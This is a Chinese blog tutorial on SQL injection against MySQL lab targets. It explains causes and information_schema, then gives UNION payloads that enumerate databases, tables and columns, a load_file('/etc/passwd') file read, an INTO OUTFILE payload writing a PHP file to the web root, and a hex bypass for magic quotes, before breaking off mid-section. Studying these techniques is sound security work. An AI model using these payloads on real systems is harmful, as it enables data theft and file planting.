<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入总结 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入总结" />
<meta property="og:description" content="文章目录 SQL注入原理1、理解SQL注入2、SQL注入的产生过程及常见原因 MYSQL注入思路SQL注入基础知识1、关于information_schema**2、关于字符型、数值型的判断3、关于跨库攻击4、关于文件读写函数5、关于魔术引号6、关于盲注与报错注入7、关于二次注入8、关于宽字节注入（%df&#39;) DVWA 普通手工SQL注入DVWA sqlmap工具实现SQL注入DVWA 盲注DVWA 报错注入SQL注入绕过SQL注入防护 SQL注入原理 1、理解SQL注入 SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。 如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 2、SQL注入的产生过程及常见原因 1.产生过程 大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。 2.常见的sql注入产生原因 2.1.不当的处理类型 Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 2.2.不安全的数据库配置 数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。 这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。 2.3.不合理的查询集处理 有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。 2.4.不当的错误处理 错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 2.5.多个提交处理不当 大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。 应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 MYSQL注入思路 SQL注入基础知识 1、关于information_schema** 1.information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 2.information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。 1.SCHEMATA 表：当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据 mysql&gt; use information_schema; mysql&gt; select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA; &#43;--------------------&#43;----------------------------&#43; | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | &#43;--------------------&#43;----------------------------&#43; | information_schema | utf8 | | challenges | gbk | | mysql | latin1 | | performance_schema | utf8 | | security | gbk | &#43;--------------------&#43;----------------------------&#43; 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/211961cd268e92feead62068dd3d36a1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-23T14:25:49+08:00" />
<meta property="article:modified_time" content="2023-04-23T14:25:49+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入总结</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#SQL_4" rel="nofollow">SQL注入原理</a></li><li><ul><li><ul><li><a href="#1SQL_5" rel="nofollow">1、理解SQL注入</a></li><li><a href="#2SQL_12" rel="nofollow">2、SQL注入的产生过程及常见原因</a></li></ul> 
   </li></ul> 
   </li><li><a href="#MYSQL_33" rel="nofollow">MYSQL注入思路</a></li><li><a href="#SQL_36" rel="nofollow">SQL注入基础知识</a></li><li><ul><li><ul><li><a href="#1information_schema_37" rel="nofollow">1、关于information_schema**</a></li><li><a href="#2_101" rel="nofollow">2、关于字符型、数值型的判断</a></li><li><a href="#3_104" rel="nofollow">3、关于跨库攻击</a></li><li><a href="#4_183" rel="nofollow">4、关于文件读写函数</a></li><li><a href="#5_224" rel="nofollow">5、关于魔术引号</a></li><li><a href="#6_241" rel="nofollow">6、关于盲注与报错注入</a></li><li><a href="#7_292" rel="nofollow">7、关于二次注入</a></li><li><a href="#8df_317" rel="nofollow">8、关于宽字节注入（%df')</a></li></ul> 
   </li></ul> 
   </li><li><a href="#DVWA_SQL_335" rel="nofollow">DVWA 普通手工SQL注入</a></li><li><a href="#DVWA_sqlmapSQL_471" rel="nofollow">DVWA sqlmap工具实现SQL注入</a></li><li><a href="#DVWA__572" rel="nofollow">DVWA 盲注</a></li><li><a href="#DVWA__717" rel="nofollow">DVWA 报错注入</a></li><li><a href="#SQL_780" rel="nofollow">SQL注入绕过</a></li><li><a href="#SQL_822" rel="nofollow">SQL注入防护</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<p><img src="https://images2.imgbox.com/cd/2a/QoedCN5V_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="SQL_4"></a>SQL注入原理</h3> 
<h5><a id="1SQL_5"></a>1、理解SQL注入</h5> 
<pre><code class="prism language-bash">	SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。

	如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 
</code></pre> 
<h5><a id="2SQL_12"></a>2、SQL注入的产生过程及常见原因</h5> 
<pre><code class="prism language-bash"><span class="token number">1</span>.产生过程
	大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C<span class="token comment">##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</span>

<span class="token number">2</span>.常见的sql注入产生原因
	<span class="token number">2.1</span>.不当的处理类型
	Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 
	<span class="token number">2.2</span>.不安全的数据库配置
	数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。
	这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。
	<span class="token number">2.3</span>.不合理的查询集处理
	有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。
	<span class="token number">2.4</span>.不当的错误处理
	错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。
	<span class="token number">2.5</span>.多个提交处理不当
	大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。
	应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。
	例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。
</code></pre> 
<h3><a id="MYSQL_33"></a>MYSQL注入思路</h3> 
<p><img src="https://images2.imgbox.com/f2/4d/wSE0Bl26_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="SQL_36"></a>SQL注入基础知识</h3> 
<h5><a id="1information_schema_37"></a>1、关于information_schema**</h5> 
<pre><code class="prism language-bash"><span class="token number">1</span>.information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据<span class="token punctuation">(</span>关于数据的数据<span class="token punctuation">)</span>，例如数据库名、表名、列的数据类型、访问权限等。

<span class="token number">2</span>.information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。
</code></pre> 
<pre><code class="prism language-bash"><span class="token number">1</span>.SCHEMATA 表：当前 mysql 实例中所有数据库的信息。SHOW DATABASES<span class="token punctuation">;</span> 命令从这个表获取数据

mysql<span class="token operator">&gt;</span> use information_schema<span class="token punctuation">;</span>
mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA<span class="token punctuation">;</span>
+--------------------+----------------------------+
<span class="token operator">|</span> SCHEMA_NAME        <span class="token operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="token operator">|</span>
+--------------------+----------------------------+
<span class="token operator">|</span> information_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span>
<span class="token operator">|</span> challenges         <span class="token operator">|</span> gbk                        <span class="token operator">|</span>
<span class="token operator">|</span> mysql              <span class="token operator">|</span> latin1                     <span class="token operator">|</span>
<span class="token operator">|</span> performance_schema <span class="token operator">|</span> utf8                       <span class="token operator">|</span>
<span class="token operator">|</span> security           <span class="token operator">|</span> gbk                        <span class="token operator">|</span>
+--------------------+----------------------------+

<span class="token number">2</span>.TABLES 表：存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX<span class="token punctuation">;</span> 命令从这个表获取结果。

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit <span class="token number">0,5</span><span class="token punctuation">;</span>
+---------------+--------------------+---------------------------------------+
<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME                            <span class="token operator">|</span>
+---------------+--------------------+---------------------------------------+
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS                        <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS                            <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATION_CHARACTER_SET_APPLICABILITY <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> <span class="token environment constant">COLUMNS</span>                               <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLUMN_PRIVILEGES                     <span class="token operator">|</span>
+---------------+--------------------+---------------------------------------+
<span class="token number">5</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token number">3</span>.<span class="token environment constant">COLUMNS</span> 表：存储表中的列信息，包括表有多少列、每个列的类型等。SHOW <span class="token environment constant">COLUMNS</span> FROM schemaname.tablename 命令从这个表获取结果。

mysql<span class="token operator">&gt;</span> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM <span class="token environment constant">COLUMNS</span> LIMIT <span class="token number">2,5</span><span class="token punctuation">;</span>
+---------------+--------------------+----------------+
<span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> TABLE_SCHEMA       <span class="token operator">|</span> TABLE_NAME     <span class="token operator">|</span>
+---------------+--------------------+----------------+
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> CHARACTER_SETS <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
<span class="token operator">|</span> def           <span class="token operator">|</span> information_schema <span class="token operator">|</span> COLLATIONS     <span class="token operator">|</span>
+---------------+--------------------+----------------+

<span class="token number">4</span>.USER_PRIVILEGES 表：用户权限表。内容源自 mysql.user 授权表。是非标准表。

mysql<span class="token operator">&gt;</span> SELECT * FROM USER_PRIVILEGES limit <span class="token number">0,5</span><span class="token punctuation">;</span>
+--------------------+---------------+----------------+--------------+
<span class="token operator">|</span> GRANTEE            <span class="token operator">|</span> TABLE_CATALOG <span class="token operator">|</span> PRIVILEGE_TYPE <span class="token operator">|</span> IS_GRANTABLE <span class="token operator">|</span>
+--------------------+---------------+----------------+--------------+
<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> SELECT         <span class="token operator">|</span> YES          <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> INSERT         <span class="token operator">|</span> YES          <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> UPDATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> DELETE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token string">'root'</span>@<span class="token string">'localhost'</span> <span class="token operator">|</span> def           <span class="token operator">|</span> CREATE         <span class="token operator">|</span> YES          <span class="token operator">|</span>
+--------------------+---------------+----------------+--------------+
<span class="token number">5</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
</code></pre> 
<h5><a id="2_101"></a>2、关于字符型、数值型的判断</h5> 
<p><img src="https://images2.imgbox.com/36/05/QKPKwe5y_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="3_104"></a>3、关于跨库攻击</h5> 
<p><strong>3.1、提前准备</strong></p> 
<pre><code class="prism language-bash">mysql<span class="token operator">&gt;</span> create database book<span class="token punctuation">;</span>
mysql<span class="token operator">&gt;</span> use book<span class="token punctuation">;</span>
mysql<span class="token operator">&gt;</span> CREATE TABLE IF NOT EXISTS book<span class="token punctuation">(</span>    <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> INT UNSIGNED AUTO_INCREMENT,    <span class="token variable"><span class="token variable">`</span>book_title<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>book_author<span class="token variable">`</span></span> VARCHAR<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span> NOT NULL,    <span class="token variable"><span class="token variable">`</span>submission_date<span class="token variable">`</span></span> DATE,    PRIMARY KEY <span class="token punctuation">(</span> <span class="token variable"><span class="token variable">`</span>book_id<span class="token variable">`</span></span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT <span class="token assign-left variable">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span>
mysql<span class="token operator">&gt;</span> show databases<span class="token punctuation">;</span>
+--------------------+
<span class="token operator">|</span> Database           <span class="token operator">|</span>
+--------------------+
<span class="token operator">|</span> information_schema <span class="token operator">|</span>
<span class="token operator">|</span> book               <span class="token operator">|</span>
<span class="token operator">|</span> mysql              <span class="token operator">|</span>
<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
+--------------------+
mysql<span class="token operator">&gt;</span> use book<span class="token punctuation">;</span>
mysql<span class="token operator">&gt;</span> show tables<span class="token punctuation">;</span>
+----------------+
<span class="token operator">|</span> Tables_in_book <span class="token operator">|</span>
+----------------+
<span class="token operator">|</span> book           <span class="token operator">|</span>
+----------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> desc book<span class="token punctuation">;</span>
+-----------------+------------------+------+-----+---------+----------------+
<span class="token operator">|</span> Field           <span class="token operator">|</span> Type             <span class="token operator">|</span> Null <span class="token operator">|</span> Key <span class="token operator">|</span> Default <span class="token operator">|</span> Extra          <span class="token operator">|</span>
+-----------------+------------------+------+-----+---------+----------------+
<span class="token operator">|</span> book_id         <span class="token operator">|</span> int<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> unsigned <span class="token operator">|</span> NO   <span class="token operator">|</span> PRI <span class="token operator">|</span> NULL    <span class="token operator">|</span> auto_increment <span class="token operator">|</span>
<span class="token operator">|</span> book_title      <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>     <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
<span class="token operator">|</span> book_author     <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>      <span class="token operator">|</span> NO   <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
<span class="token operator">|</span> submission_date <span class="token operator">|</span> <span class="token function">date</span>             <span class="token operator">|</span> YES  <span class="token operator">|</span>     <span class="token operator">|</span> NULL    <span class="token operator">|</span>                <span class="token operator">|</span>
+-----------------+------------------+------+-----+---------+----------------+
<span class="token number">4</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
</code></pre> 
<p><strong>3.2、注入流程</strong><br> 3.2.1、打开网页进行查询当前数据库的用户、数据库名</p> 
<pre><code class="prism language-bash">注意：跨库查询的前提条件是必须高权限的用户才能执行跨库查询

// 查询当前数据库的用户，可以看到当前用户为root拥有最高的权限
?id<span class="token operator">=</span>-1%20union%20select%201,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,3

// 查询当前数据库的数据库名，获取到当前网站的数据库是security
?id<span class="token operator">=</span>-1%20union%20select%201,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,3
</code></pre> 
<p><img src="https://images2.imgbox.com/98/0d/Hn3ypPSE_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/a2/fd/jiepB9pi_o.png" alt="在这里插入图片描述"></p> 
<p>3.2.2、获取到所有的数据库名称</p> 
<pre><code class="prism language-bash">union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>,3 from information_schema.schemata

备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。
</code></pre> 
<p><img src="https://images2.imgbox.com/96/89/0Zs1EFzw_o.png" alt="在这里插入图片描述"></p> 
<p>3.2.3、指定获取book库中的表名信息</p> 
<pre><code class="prism language-bash">union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,3 from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'book'</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b6/ee/CVUhxw4a_o.png" alt="在这里插入图片描述"></p> 
<p>3.2.4、获取指定数据库book下的book表的列名信息</p> 
<pre><code class="prism language-bash">union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3 from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'book'</span> and <span class="token assign-left variable">table_schema</span><span class="token operator">=</span><span class="token string">'book'</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/49/a1/VyaZZ8ch_o.png" alt="在这里插入图片描述"></p> 
<p>3.2.5、查询到指定数据</p> 
<pre><code class="prism language-bash">union  <span class="token keyword">select</span> book_id,book_title,book_author from book.book
</code></pre> 
<p><img src="https://images2.imgbox.com/75/6d/YhOrTjqZ_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="4_183"></a>4、关于文件读写函数</h5> 
<p><strong>4.1、函数介绍</strong></p> 
<pre><code class="prism language-bash">load_file							文件读取
into outfile 或into dumpfile		文件写入
</code></pre> 
<p><strong>4.2、查询是否有写入的权限</strong></p> 
<pre><code class="prism language-bash">在 MySQL <span class="token number">5.5</span> 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
在 MySQL <span class="token number">5.5</span>之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

mysql<span class="token operator">&gt;</span> show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>
+------------------+-------+
<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>
+------------------+-------+
<span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>
+------------------+-------+
</code></pre> 
<p><img src="https://images2.imgbox.com/f7/a7/VWkafodc_o.png" alt="在这里插入图片描述"></p> 
<p><strong>4.3、文件读取</strong></p> 
<pre><code class="prism language-bash">?id<span class="token operator">=</span>-2%20union%20select%201,load_file<span class="token punctuation">(</span>%27/etc/passwd%27<span class="token punctuation">)</span>,3
等同于
<span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">\</span>G<span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/24/ee/G8hAnQi5_o.png" alt="在这里插入图片描述"></p> 
<p><strong>4.4、文件写入</strong></p> 
<pre><code class="prism language-bash">?id<span class="token operator">=</span>-2%20union%20select%201,%2<span class="token operator"><span class="token file-descriptor important">7</span>&lt;</span>?php%20phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>%20?<span class="token operator">&gt;</span>%27,3%20into%20outfile%20%27./test.php%27
等同于
<span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?&gt;'</span> into outfile <span class="token string">'/var/www/html/test.php'</span>

注意：在linux中默认是对/var/lib/mysql目录下有写入权限对其他目录是没有写入权限，若想在/var/www/html/下面写入，需要对目录修改权限
</code></pre> 
<p><img src="https://images2.imgbox.com/03/fa/MpAxlZfj_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="5_224"></a>5、关于魔术引号</h5> 
<pre><code class="prism language-bash"><span class="token number">1</span>.简介
魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义，这个的作用跟addslashes<span class="token punctuation">(</span><span class="token punctuation">)</span>的作用完全相同：正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。

<span class="token number">2</span>.为什么在PHP5.4.0及其之后PHP版本中被取消
	<span class="token number">2.1</span>.可移植性
	编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc<span class="token punctuation">(</span><span class="token punctuation">)</span> 来检查是否打开，并据此编程。 
	<span class="token number">2.2</span>.性能
 	由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes<span class="token punctuation">(</span><span class="token punctuation">)</span>）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。
	<span class="token number">2.3</span>.方便
由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 '。针对这个问题，可以使用 stripslashes<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数处理。

<span class="token number">3</span>.绕过方法
采用hex<span class="token punctuation">(</span><span class="token number">16</span>进制<span class="token punctuation">)</span>编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。
</code></pre> 
<h5><a id="6_241"></a>6、关于盲注与报错注入</h5> 
<p><strong>6.1、盲注</strong></p> 
<pre><code class="prism language-bash"><span class="token number">1</span>.简介
在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，需要使用一些特殊的方式来判断，这个过程成为盲注。

<span class="token number">2</span>.分类
布尔盲注（是或不是）、时间盲注

<span class="token number">3</span>.常用函数
substr<span class="token punctuation">(</span>string str, num start, num len<span class="token punctuation">)</span>	// 从 start 位置截取 str 字符串 len 位；初始位置为1，且 len 可省略

length<span class="token punctuation">(</span>string str<span class="token punctuation">)</span>	// 返回字符串长度

ord<span class="token punctuation">(</span>string str<span class="token punctuation">)</span>	// 返回 str 最左面字符的 ASCII 码值

left<span class="token punctuation">(</span>string str, num len<span class="token punctuation">)</span>	// 从左截取 str 的前 len 位

